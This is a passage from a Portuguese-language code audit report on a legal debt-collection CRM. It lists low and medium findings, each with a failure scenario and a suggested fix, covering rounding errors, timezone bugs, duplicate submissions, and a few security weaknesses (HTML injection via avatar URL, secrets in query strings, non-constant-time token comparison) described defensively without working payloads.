- **Correção sugerida:** Sincronizar o fonte do repo com o v26 implantado (portar a branch intencao !== 'responder') antes de qualquer redeploy; idealmente extrair o fonte de prod para o repo e commitar.

### P2-48 · Normalização de telefone quebra números com DDD 55 (Rio Grande do Sul)

- **Local:** `supabase/functions/cron-mensagens-agendadas/index.ts:76` · fatia `edge-workers` · tipo `code`
- **Cenário de falha:** Mensagem agendada para um devedor com celular DDD 55 (ex.: (55) 99999-9999) armazenado sem o código do país. phoneDigits='55999999999' (11 díg.), startsWith('55')=true, phone permanece '55999999999'. O Z-API interpreta como país 55 + DDD 99..., entregando ao número errado ou falhando — a cobrança nunca chega ao devedor correto e ainda é contada como enviada se o Z-API retornar id.
- **Correção sugerida:** Normalizar por comprimento/estrutura (país só quando total for 10-11 dígitos de DDD+número) em vez de startsWith('55'), ou exigir sempre o país no armazenamento; validar length (12-13) como faz enviar-whatsapp antes de enviar.

### P2-49 · enviar-whatsapp marca envio como ok:true sem confirmar messageId (contradiz as funções irmãs)

- **Local:** `supabase/functions/enviar-whatsapp/index.ts:129` · fatia `edge-workers` · tipo `code`
- **Cenário de falha:** Chamada com skipPhoneExists=true e instância Z-API desconectada: Z-API responde HTTP 200 sem messageId/zaapId; a função devolve {ok:true, messageId:undefined}; a UI registra a cobrança como 'enviada' e o operador acredita que o devedor recebeu, quando nada foi entregue.
- **Correção sugerida:** Reusar `envioConfirmado(result.data)` (mesma lógica das outras funções) e só devolver ok:true quando houver messageId/zaapId sem campo de erro; caso contrário, 502 com detalhes.

### P2-50 · Com parcelas extras, calcularJudicial ignora multaBase e multaData — a base escolhida na UI não tem efeito

- **Local:** `templates/calc-engine.js:222` · fatia `calc` · tipo `code`
- **Cenário de falha:** Usuário configura multa 10% sobre 'valor original' e adiciona parcelas com termos próprios (fluxo comum de contratos parcelados): a multa exibida/peticionada sai sobre o corrigido+extras, maior que a contratada.
- **Correção sugerida:** No ramo com extras, respeitar multaBase: base = valorOriginal+Σextras (ORIGINAL) ou saldoCorrigidoTotal+jurosAcumuladosTotal (CORRIGIDO_JUROS); e considerar multaData como no caminho principal.

## 5. Achados P3 — baixo (42)

### P3-01 · NF automática em operação 'revisar' usa o valor cheio como base de honorário (over-declaração fiscal)

- **Local:** `api/_emitir-nf.js:51` · fatia `api-dinheiro` · tipo `code`
- **Cenário de falha:** Com AUTO_EMIT_NF=on, chega um recebimento sem acordo vinculado → operação nasce 'revisar' (valor_capital=0) → processar-recebimento chama emitir-nf → base=valor_recebido cheio → NFS-e autorizada na prefeitura sobre valor superior ao honorário real; correção posterior exige cancelamento da nota.
- **Correção sugerida:** Em emitir-nf.js, bloquear/retornar skip quando op.repasse_status==='revisar' (base indefinida) e/ou em processar-recebimento.js não auto-emitir NF para operações 'revisar'.

### P3-02 · Rateio capital/honorário por parcela acumula desvio de centavos no total repassado ao credor

- **Local:** `api/_processar-recebimento.js:86` · fatia `api-dinheiro` · tipo `code`
- **Cenário de falha:** capitalBase=100,00, acordoTotal=300,00 (ratio 0,3333…), 3 parcelas de 100,00: cada parcela repassa round2(33,333)=33,33 → total repassado ao credor = 99,99 em vez de 100,00 (1 centavo a menos). Com valores maiores/mais parcelas o desvio cresce.
- **Correção sugerida:** Fechar a última parcela pela diferença (capitalBase - soma das anteriores) ou registrar o resíduo, em vez de arredondar cada parcela isoladamente.

### P3-03 · Com acordo válido mas base de capital ausente, recebimento é classificado como 'nao_aplica' e o credor não recebe repasse

- **Local:** `api/_processar-recebimento.js:88` · fatia `api-integracoes` · tipo `code`
- **Cenário de falha:** Acordo importado/legado sem metadata.capital_credor e cobrancas.valor_orig ainda NULL (dado não migrado). O pagamento é processado, todo o valor recebido é tratado como honorário do escritório e a fin_operacao nasce repasse_status='nao_aplica' — o credor nunca é repassado e ninguém é alertado para revisar.
- **Correção sugerida:** Quando podeRatear=true porém capitalBase<=0, classificar repasse_status='revisar' (como no ramo !podeRatear) em vez de 'nao_aplica', forçando conferência manual da base de capital.

### P3-04 · Endpoints sem chamador no front (dead endpoints) — apenas listar

- **Local:** `api/mfa.js:1` · fatia `contratos-front-back` · tipo `decision`
- **Cenário de falha:** api/mfa.js e api/zapi.js ocupam slots de funcao serverless (limite Hobby de 12) e mascaram intencao: se o MFA foi removido do front sem remover o backend, um leitor assume que o login tem MFA quando nao tem.
- **Correção sugerida:** Confirmar se MFA/Z-API direto ainda sao usados por algum canal (extensao/webhook). Se nao, remover os endpoints mortos; se sim, documentar o caller. Nenhuma acao de codigo obrigatoria agora.

### P3-05 · 'Gerar parcelas mensais' cria a 1ª parcela adicional com o MESMO termo do item 1 (vencimentos duplicados no mês inicial)

- **Local:** `calc-juridica.html:348` · fatia `calc` · tipo `code`
- **Cenário de falha:** Contrato de 12 parcelas mensais a partir de 10/01/2025: usuário preenche item 1 com a 1ª parcela e clica 'Gerar' com Qtd=11 → a parcela 2 é datada 10/01/2025 (igual à 1ª) e a última gerada é 10/11/2025 em vez de 10/12/2025 — correção e juros errados em duas parcelas do memorial.
- **Correção sugerida:** Gerar com `base.getMonth()+i+1` (ou deixar explícito na UI que a Qtd inclui o item 1 e gerar a partir de +1).

### P3-06 · renderAvatarHTML interpola avatar_url sem escape dentro de atributo style via innerHTML — injeção de HTML cross-user

- **Local:** `crm.html:3736` · fatia `crm-casos-peticoes` · tipo `code`
- **Cenário de falha:** Operador mal-intencionado (ou conta comprometida) faz `sb.from('profiles').update({avatar_url: '<payload>'})` no próprio perfil; quando um admin abre qualquer lista de casos onde esse operador é responsável, o HTML injetado executa na sessão do admin (roubo de sessão Supabase do localStorage, ações como admin).
- **Correção sugerida:** Escapar/validar `foto` antes de interpolar (aceitar apenas URLs http(s)/data:image via new URL() + whitelist de esquema, e usar escapeHTML no valor), ou montar o elemento via DOM (el.style.backgroundImage = `url(${JSON.stringify(url)})`).

### P3-07 · Filtro 'Fase' processual, ordenação 'Próxima audiência' e handoff pra Bia leem campos de checklistJudicial que nenhum código escreve

- **Local:** `crm.html:4757` · fatia `crm-casos-peticoes` · tipo `code`
- **Cenário de falha:** Advogado seleciona Fase = 'Protocolada' na tela Ações Judiciais para ver processos protocolados: a lista fica vazia mesmo havendo processos protocolados, dando a impressão de que não há casos; e ao abrir 'Gerar peça (Bia)' o número do processo/comarca nunca vem preenchido.
- **Correção sugerida:** Ou adicionar UI que grave fase/proximaAudiencia/comarca/vara/numero_processo no checklist_judicial (via atualizarCaso), ou remover as opções mortas do filtro/ordenador e ler comarca/processo de proc_peticionamentos no handoff da Bia.

### P3-08 · Botão excluir template quebra (SyntaxError) quando o nome do template contém apóstrofo — escape na ordem errada

- **Local:** `crm.html:5136` · fatia `crm-casos-peticoes` · tipo `code`
- **Cenário de falha:** Template chamado "Execução — D'Ávila" na lista de Configurações: clicar no 🗑 lança 'SyntaxError: unexpected token' no onclick e a exclusão nunca acontece, sem nenhum feedback ao usuário.
- **Correção sugerida:** Trocar o onclick inline por addEventListener com closure sobre o objeto t (como já é feito nas listas de anexos em pecaRenderAnexos), ou passar só o id e buscar o nome no _templatesCache dentro de excluirTemplateDireto.

### P3-09 · Duplicar template perde cabeçalho, rodapé, logo e requisitos do original

- **Local:** `crm.html:5457` · fatia `crm-casos-peticoes` · tipo `code`
- **Cenário de falha:** Admin duplica um template que tem cabeçalho customizado com logo do escritório para criar uma variante: a peça gerada da cópia sai com o cabeçalho genérico de fallback e sem logo, diferente do template original, sem aviso.
- **Correção sugerida:** Incluir cabecalho_html, rodape_html, logo_storage_path e requisitos no objeto `novo` de duplicarTemplate.

### P3-10 · Default do modal Agendar usa toISOString (UTC) em input datetime-local — abre com 12:00 em vez de 09:00

- **Local:** `crm.html:7131` · fatia `crm-pendentes` · tipo `code`
- **Cenário de falha:** Operadora clica em Agendar e confirma sem mexer na hora, assumindo o padrão 'amanhã 09:00' descrito no código: a mensagem sai às 12:00. Num caso extremo de fuso positivo, a data poderia até cair no dia seguinte ao esperado.
- **Correção sugerida:** Formatar em hora local: por exemplo `const p=n=>String(n).padStart(2,'0'); value = amanha.getFullYear()+'-'+p(amanha.getMonth()+1)+'-'+p(amanha.getDate())+'T'+p(amanha.getHours())+':'+p(amanha.getMinutes())`.

### P3-11 · Default do agendamento de mensagem usa toISOString (UTC) em input datetime-local — hora exibida errada

- **Local:** `crm.html:7131` · fatia `crm-geral` · tipo `code`
- **Cenário de falha:** Operadora clica 'Agendar mensagem' esperando o padrão 09:00 e confirma sem alterar: a cobrança sai às 12:00 do dia seguinte (ou, em cenários de meia-noite, no dia errado).
- **Correção sugerida:** Formatar em horário local: montar 'YYYY-MM-DDTHH:mm' com getFullYear/getMonth/getDate/getHours/getMinutes (como já se faz em _hojeISO para datas).

### P3-12 · Auto-cobrança ZapSign pode agendar em duplicidade com múltiplas abas (checagem por histórico não é atômica)

- **Local:** `crm.html:7256` · fatia `crm-geral` · tipo `code`
- **Cenário de falha:** Operadora com o CRM aberto em duas abas (ambas logadas ~ao mesmo tempo): aos 10s cada aba avalia o mesmo caso >24h sem assinatura e ambas agendam 'auto_cobranca_24h' → devedor recebe o lembrete de assinatura em dobro.
- **Correção sugerida:** Criar unique index parcial em crm_mensagens_agendadas (caso_id, origem) para origens auto_cobranca_*, ou gravar a marca no histórico via update com lock ANTES do insert e só inserir se o update confirmou.

### P3-13 · pecaImprimir não trata window.open retornando null (popup bloqueado) — exceção não capturada e nada acontece

- **Local:** `crm.html:10250` · fatia `crm-casos-peticoes` · tipo `code`
- **Cenário de falha:** Usuário com bloqueador de popups clica '🖨 Imprimir' na etapa 4 do gerador de peças: nada acontece na tela (erro só no console), e ele não recebe a dica de liberar popups que as outras telas dão.
- **Correção sugerida:** Adicionar `if (!w) { toast('Bloqueado pelo navegador — libere popups.', 'error'); return; }` após o window.open, igual a calcUnificadaExportarPDF.

### P3-14 · MATRIZ.md desatualizado: lista calc-juridica.html como 'não migrado, com tabelas próprias TABELA_*_EMBUTIDA', mas a v3 já consome a matriz

- **Local:** `docs/calc/MATRIZ.md:48` · fatia `calc` · tipo `doc`
- **Cenário de falha:** Na rotina mensal, quem segue o MATRIZ.md atualiza 'INPC/IPCA/SELIC/TJPR' e não atualiza IGP-M/IGP-DI/TAXA-LEGAL (usados por calc-juridica e pelo regime Lei 14.905) — cálculos com Taxa Legal param de corrigir os meses novos silenciosamente (fallback 1% a.m. dias/30 nos juros).
- **Correção sugerida:** Atualizar o MATRIZ.md: remover o item 2 do 'NÃO migrado', incluir calc-juridica.html entre os consumidores e listar todas as 7 séries (INPC, IPCA, IGP-M, IGP-DI, SELIC, TJPR, TAXA-LEGAL) na rotina mensal.

### P3-15 · RPC cobrasq_merge existe em prod mas nao tem migration (drift, sem fonte unica)

- **Local:** `index.html:4605` · fatia `contratos-front-back` · tipo `migration`
- **Cenário de falha:** Ao reconstruir o banco de dev/staging apenas a partir de supabase/migrations/, cobrasq_merge nao e criada; toda gravacao do painel de faturamento passa a usar o fallback de blob inteiro silenciosamente, degradando o mecanismo anti-perda F-20.
- **Correção sugerida:** Extrair a definicao atual de cobrasq_merge de producao (pg_get_functiondef) e versiona-la como migration idempotente em supabase/migrations/, encerrando o drift.

### P3-16 · Import Astrea: 'Salvar no sistema' sem trava de duplo-clique duplica devedores (e tenta duplicar a cobrança)

- **Local:** `index.html:6740` · fatia `idx-docs-peticoes` · tipo `code`
- **Cenário de falha:** Usuário dá dois cliques rápidos em 'Salvar no sistema' num caso com 3 envolvidos novos: os 3 contatos são criados duas vezes em devedores; a 2ª cobrança falha ('duplicate key') e aparece toast de erro apesar de a 1ª ter sido criada.
- **Correção sugerida:** Desabilitar o botão no início de _impSalvar (data-imp-save) e reabilitar no catch, ou usar um Set _impSaving com early-return.

### P3-17 · "Recuperado no mês" e janelas de período usam toISOString (UTC) — vira o mês 3h mais cedo

- **Local:** `index.html:8287` · fatia `idx-financeiro` · tipo `code`
- **Cenário de falha:** Às 22h de 31/07 o gestor abre o Painel: "Recuperado no mês" mostra R$ 0 (está computando agosto) apesar de todas as baixas de julho, e o comparativo mensal exibe queda de 100%.
- **Correção sugerida:** Usar formatação local (mesma função hoje()/_metaYmd já existente) em vez de toISOString para derivar YYYY-MM/YYYY-MM-DD.

### P3-18 · KPI "acordos vencendo em 7 dias" conta parcelas de devedores arquivados

- **Local:** `index.html:8420` · fatia `idx-painel-devedores` · tipo `code`
- **Cenário de falha:** Gestor arquiva um devedor com acordo em andamento; o painel continua mostrando 'N acordos vencendo em 7 dias' contando as parcelas do arquivado, e o sino de alertas segue avisando 'Parcela de Fulano vence em...' para um caso que não existe mais na operação.
- **Correção sugerida:** Filtrar `!d.arquivado && !d.isDraft` antes de varrer acordos/parcelas em acordosVencendo (8419-8420) e no alerta correspondente de getAlertas (31012).

### P3-19 · Bloco "Score interno" do drawer nunca renderiza (dev.score inexistente) e a legenda inverte a semântica do score

- **Local:** `index.html:10211` · fatia `idx-painel-devedores` · tipo `code`
- **Cenário de falha:** Nenhum usuário jamais vê o painel 'Score interno' no drawer (score sempre 0). Se alguém 'corrigir' trocando por calcScore(dev), um devedor 90+ dias em atraso (score ~85) passaria a ser rotulado 'Excelente pagador' — informação de risco invertida.
- **Correção sugerida:** Usar calcScore(dev) no drawer e trocar a legenda para as faixas oficiais (Urgente/Alto/Médio/Normal via scoreBadgeHtml), removendo os textos 'Excelente/Bom pagador'.

### P3-20 · Botão "+ Add" de Etiquetas no drawer abre o modal de registrar contato, não um editor de tags

- **Local:** `index.html:10287` · fatia `idx-painel-devedores` · tipo `code`
- **Cenário de falha:** Usuário quer etiquetar um devedor pelo drawer, clica em '+ Add' sob 'Etiquetas' e recebe o formulário 'Nova interação' (tipo Ligação); se preencher, cria um registro de contato espúrio no histórico e nenhuma tag é adicionada.
- **Correção sugerida:** Apontar o botão para o editor de tags (abrir o modal de edição do devedor na seção de tags, ou um promptModal que faça dev.tags.push + save + renderDrawerBody).

### P3-21 · Página Processos exibe rascunhos (is_draft) — classe R-03

- **Local:** `index.html:13218` · fatia `idx-cobrancas-acordos` · tipo `code`
- **Cenário de falha:** Colaborador salva um cadastro incompleto como rascunho; o caso some (correto) de Devedores e Cobranças, mas aparece na tela Processos e infla a contagem/valor 'em disputa' apresentada ao gestor.
- **Correção sugerida:** Trocar o filtro para `devs.filter(d => !d.arquivado && !d.isDraft)` na linha 13218.

### P3-22 · Busca da tela Processos perde o foco e renderiza com valor defasado a cada tecla (handler duplicado)

- **Local:** `index.html:13340` · fatia `idx-cobrancas-acordos` · tipo `code`
- **Cenário de falha:** Gestor tenta digitar 'bordin' na busca de Processos: após o 'b' o campo perde o foco; precisa clicar no input 6 vezes para completar a palavra.
- **Correção sugerida:** Remover o oninput inline (deixar só o addEventListener que seta _procSearch) e restaurar o foco/caret após o re-render, ou re-renderizar apenas a lista (não o input).

### P3-23 · Busca de Intimações (e de Processos) perde o foco a cada tecla — re-render destrói o input durante a digitação

- **Local:** `index.html:13574` · fatia `idx-docs-peticoes` · tipo `code`
- **Cenário de falha:** Usuário tenta digitar '0001234' na busca de intimações: após o '0' o campo perde o foco; é preciso clicar de novo a cada caractere.
- **Correção sugerida:** Filtrar sem re-render total (atualizar só a lista) ou re-focar o input com restauração da posição do cursor após o render (como debounce + focus()).

### P3-24 · Duplo clique em 'Salvar cobrança' cria cobrança, devedores e tarefas em duplicidade

- **Local:** `index.html:15497` · fatia `idx-cobrancas-acordos` · tipo `code`
- **Cenário de falha:** Rede lenta: usuário clica 2x em 'Salvar cobrança'. Resultado: 2 cobranças idênticas, 2 devedores com o mesmo CPF (ou erro do índice de doc na 2ª, deixando lixo parcial) e 2 tarefas de primeiro contato no quadro.
- **Correção sugerida:** Desabilitar o botão no início de salvarCobranca (e reabilitar no finally) ou usar um flag _salvandoCobranca de reentrância.

### P3-25 · Documento de confissão de dívida: parcelas iguais (valor/n) não somam o total confessado

- **Local:** `index.html:17392` · fatia `idx-portais` · tipo `code`
- **Cenário de falha:** Cedente gera confissão de R$ 100,00 em 3 parcelas: documento diz '3 parcelas de R$ 33,33', que somam R$ 99,99 — R$ 0,01 a menos que o valor confessado; em valores maiores/quantidades de parcelas o desvio cresce.
- **Correção sugerida:** Ajustar a última parcela pelo resto (valParc arredondado nas N-1 primeiras e a última = valor - soma das anteriores), ou exibir 'N-1 de X e 1 de Y'.

### P3-26 · chatPersist pode inserir a mesma conversa duas vezes em peticao_conversas (debounce + salvar manual concorrentes)

- **Local:** `index.html:20408` · fatia `idx-docs-peticoes` · tipo `code`
- **Cenário de falha:** Usuário envia o 1º turno (dispara autosave em 1,5s) e clica 'Salvar' logo em seguida: duas conversas idênticas aparecem na lista; edições futuras atualizam só uma, e a outra permanece com estado antigo.
- **Correção sugerida:** Guardar a promise do insert em curso (`_chat._persisting`) e aguardá-la nas chamadas seguintes, ou desabilitar o botão e cancelar o timer antes do persist manual (clearTimeout(_chatSaveTimer) dentro de chatPersist).

### P3-27 · Totais financeiros incluem lançamentos cancelados (status 3)

- **Local:** `index.html:21058` · fatia `idx-financeiro` · tipo `code`
- **Cenário de falha:** Gestor cancela uma receita de R$ 20.000 lançada por engano; a tabela mostra riscado, mas "Entradas (jul)" e o faturamento 12m continuam contando os R$ 20.000.
- **Correção sugerida:** Adicionar `.neq('status',3)` (ou `.in('status',[0,1,2])`) a todas as agregações de fin_lancamento.

### P3-28 · despesaMes usa Math.abs da soma (não soma dos absolutos) — quebra se entrar despesa com sinal positivo

- **Local:** `index.html:21064` · fatia `idx-financeiro` · tipo `code`
- **Cenário de falha:** Um sync do Controlle importa uma despesa estornada/ajustada com valor +500: "Saídas (mês)" cai R$ 1.000 em relação ao real (500 que faltou somar + 500 abatido), divergindo do gráfico Receita×Despesa.
- **Correção sugerida:** Somar `Math.abs(+r.valor||0)` por linha dentro de sumValor quando tipo_movimento=0 (como fazem _serie12m e _carregarDadosRelat).

### P3-29 · _carregarResumoAsaasVisao é código morto: o elemento #visao-asaas-resumo não existe mais

- **Local:** `index.html:22520` · fatia `idx-financeiro` · tipo `decision`
- **Cenário de falha:** Ninguém vê o resumo Asaas na Visão (a informação prometida pela função nunca aparece); um dev futuro pode reintroduzir o container e herdar os totais subestimados de 50 cobranças e o saldo "R$ 0,00" em caso de erro.
- **Correção sugerida:** Decidir: remover a função ou reintroduzir o container na Visão — nesse caso corrigindo o limite de 50 e o tratamento de balance null (exibir erro, não 0).

### P3-30 · Saldo realizado igual a zero cai no fallback e exibe o saldo inicial

- **Local:** `index.html:22901` · fatia `idx-financeiro` · tipo `code`
- **Cenário de falha:** Conta com saldo_inicial de R$ 10.000 que foi integralmente consumido (saldo_atual = 0): o card da aba Contas volta a exibir R$ 10.000 e o check "✓ bate" compara contra o número errado.
- **Correção sugerida:** Trocar por `const saldoRealizado = (s.saldo_atual != null) ? +s.saldo_atual : saldoInicial;`.

### P3-31 · Consulta do burst (#248) corta as mensagens mais novas e calcula o 'último envio' sobre 500 eventos globais sem filtro de telefone

- **Local:** `index.html:25602` · fatia `idx-whatsapp-bia` · tipo `code`
- **Cenário de falha:** Com ~600 mensagens acumuladas nos telefones pendentes, o cliente manda 'oi / quero alterar o vencimento / consegue ver?' hoje: o limit(500) ascendente não traz essas linhas e o operador vê como rajada mensagens antigas (ou apenas a última do fallback), respondendo sem o contexto real.
- **Correção sugerida:** Ordenar descending com limit e reverter no cliente (ou filtrar recebida_em >= now()-interval curto), e filtrar crm_mensagens_status com .in('telefone_enviado', telsBurst) (ou por dígitos) antes do limit.

### P3-32 · Restaurar devolve a conversa com recebida_em sobrescrito pela hora da resolução — SLA, ordenação e 'há quanto tempo' ficam errados

- **Local:** `index.html:26000` · fatia `idx-whatsapp-bia` · tipo `code`
- **Cenário de falha:** Conversa aguardando há 5h é arquivada por engano e restaurada em seguida: ela reaparece na fila como 'há 0 min', fora do alerta de SLA e no fim da ordenação — o operador prioriza outras e o cliente que já esperava 5h continua sem resposta.
- **Correção sugerida:** Guardar o recebida_em original no objeto arquivado (ex.: `resolvida_em` separado para exibição em Resolvidas) e, no Restaurar, devolver o recebida_em original; persistir a recebida original em resolvido_em/updated_at já cobre a visão Resolvidas.

### P3-33 · Prompt da minuta rotula dev.valorAtual (valor já atualizado, com taxa) como 'VALOR ORIGINAL DA DÍVIDA'

- **Local:** `index.html:28058` · fatia `idx-docs-peticoes` · tipo `code`
- **Cenário de falha:** Notificação extrajudicial gerada para devedor com valorOrig R$ 5.000 e valorAtual R$ 7.800 (com taxa COBRASQ): o texto sai declarando 'valor original da dívida R$ 7.800,00', deturpando o principal em documento enviado ao devedor.
- **Correção sugerida:** Inverter a prioridade (valorOrig primeiro) ou enviar os dois campos rotulados corretamente (original × atualizado) no prompt.

### P3-34 · nfaParseValor interpreta milhar pt-BR sem centavos ('1.500') como R$ 1,50 — erro de 1000x no valor da nota

- **Local:** `index.html:29244` · fatia `idx-nf` · tipo `code`
- **Cenário de falha:** Usuário cola 'Fulano; 111.222.333-44; 1.500' (honorário de R$ 1.500,00 sem centavos). A linha entra como R$ 1,50, elegível, e a NFS-e é emitida com base 1000x menor — e o dedup por CPF+valor não acusa nada porque o valor é outro.
- **Correção sugerida:** Tratar ponto único seguido de exatamente 3 dígitos finais como separador de milhar (padrão pt-BR): '1.500'→1500; manter '1234.56' (2 decimais) como está.

### P3-35 · Remover linha da tabela durante a emissão do lote desloca os índices: notas confirmadas são puladas e o lote aborta com TypeError

- **Local:** `index.html:29733` · fatia `idx-nf` · tipo `code`
- **Cenário de falha:** Lote de 10 confirmado; durante a emissão da 2ª o usuário clica ✕ numa linha pendente. Os índices 3..9 apontam para linhas erradas, o índice final cai fora do array e o TypeError aborta o lote no meio — parte das notas confirmadas nunca é emitida e a tela fica travada até recarregar.
- **Correção sugerida:** Capturar as referências das rows (não índices) no momento da confirmação e desabilitar remoção/edição de linhas enquanto `prog.dataset.busy==='1'`; envolver o corpo do loop em try/catch.

### P3-36 · Rejeição imediata da prefeitura (HTTP 200 + nf_status='erro') vira 'HTTP 200' na tabela do lote — motivo real descartado

- **Local:** `index.html:29748` · fatia `idx-nf` · tipo `code`
- **Cenário de falha:** Prefeitura recusa a nota na hora (ex.: serviço não pertence ao prestador). A linha do lote mostra apenas 'HTTP 200', o operador não sabe o que corrigir e tenta reemitir a mesma coisa.
- **Correção sugerida:** Incluir `j.erro` na cadeia: `traduzirErro(j.erro||j.error||j.message||('HTTP '+resp.status))`; opcionalmente tratar `j.nf_status==='erro'` como caso próprio.

### P3-37 · Dedup visual do histórico colapsa notas emitidas distintas de mesmo CPF+valor — resumo e conciliação ISS subcontam

- **Local:** `index.html:29843` · fatia `idx-nf` · tipo `code`
- **Cenário de falha:** Duas NFS-e emitidas de R$ 2.429,53 para o mesmo CPF (uma de junho pré-#237, outra de julho). A conciliação ISS mostra 1 nota e metade da base: o recolhimento de ISS calculado pela tela fica menor que o devido.
- **Correção sugerida:** Restringir o colapso a linhas não-emitidas (erro/processando empilhadas) e nunca fundir duas 'emitida' com nf_asaas_id diferentes; calcular resumo/conciliação sobre as rows brutas.

### P3-38 · Botão 'Reemitir' em nota 'processando' é um beco sem saída: a linha carregada nasce 'duplicada' e nunca fica elegível

- **Local:** `index.html:29938` · fatia `idx-nf` · tipo `code`
- **Cenário de falha:** Nota fica dias em 'processando'; usuário clica 'Reemitir', a linha entra na tabela marcada 'duplicada', e 'Emitir lote' responde 'Nenhuma linha elegível' — sem explicação do porquê nem caminho de saída.
- **Correção sugerida:** Remover o 'Reemitir' de notas 'processando' (deixar só '↻ Atualizar'), ou exigir cancelamento/arquivamento da pendente antes de recarregar a linha.

### P3-39 · Alerta "Meta abaixo de 50%" está morto: lê DB.metas, que nunca é escrito (metas vivem em DB.config.metas com outro shape)

- **Local:** `index.html:30994` · fatia `idx-painel-devedores` · tipo `code`
- **Cenário de falha:** Gestor define metas na UI atual (DB.config.metas); nenhuma meta abaixo de 50% jamais gera o alerta prometido em getAlertas/badge de notificações — o recurso silenciosamente não existe.
- **Correção sugerida:** Remover o bloco morto ou reescrevê-lo sobre DB.config.metas usando metaProgresso/metaAlvo (e, para metas de valor, recuperadoNoMes como fonte).

### P3-40 · Segredo aceito via query string ?token= (P3 de junho) persiste em asaas/zapsign/zapi

- **Local:** `supabase/functions/asaas-webhook/index.ts:59` · fatia `edge-webhooks` · tipo `decision`
- **Cenário de falha:** A URL completa do webhook (com ?token=<secret>) aparece em logs de request da Vercel/Supabase ou em ferramentas intermediárias; quem tiver acesso a esses logs obtém o segredo e pode forjar eventos (ex.: PAYMENT_RECEIVED forjado → baixa de cobrança e repasse).
- **Correção sugerida:** Preferir exclusivamente header (Authorization/asaas-access-token) e, onde o provedor permitir, remover o suporte a ?token=. Se precisar mantê-lo por limitação do provedor, rotacionar o segredo periodicamente e garantir que a query string não seja logada.

### P3-41 · Lock otimista deixa mensagens presas em 'processando' se a função estourar o tempo

- **Local:** `supabase/functions/cron-mensagens-agendadas/index.ts:137` · fatia `edge-workers` · tipo `code`
- **Cenário de falha:** Instância Z-API lenta faz vários itens do lote baterem timeout de 10s+backoff; a execução do cron é encerrada por tempo após travar 15 itens em 'processando'. Esses 15 agendamentos ficam presos para sempre (não estão mais em 'pendente'), sem envio e sem entrada em crm_envios_falhados.
- **Correção sugerida:** Adicionar um reaper (re-selecionar 'processando' com processado_em antigo e reverter para 'pendente'), ou marcar com timestamp de lock e um TTL; reduzir MAX_LOTE/timeout para caber na janela da função.

### P3-42 · Comparação de segredo do escavador não é em tempo constante (vaza comprimento e faz short-circuit) — diverge do padrão dos outros 4 webhooks

- **Local:** `supabase/functions/escavador-webhook/index.ts:33` · fatia `edge-webhooks` · tipo `code`
- **Cenário de falha:** Atacante mede o tempo de resposta variando o comprimento do Authorization Bearer para inferir o tamanho do ESCAVADOR_WEBHOOK_TOKEN, reduzindo o espaço de busca. Impacto real limitado (token forte aleatório), mas é uma regressão de postura de segurança em relação aos demais webhooks.
- **Correção sugerida:** Substituir timingSafeEqual pela mesma função safeEqual baseada em SHA-256 usada nos outros webhooks (hash dos dois lados + XOR sem short-circuit).
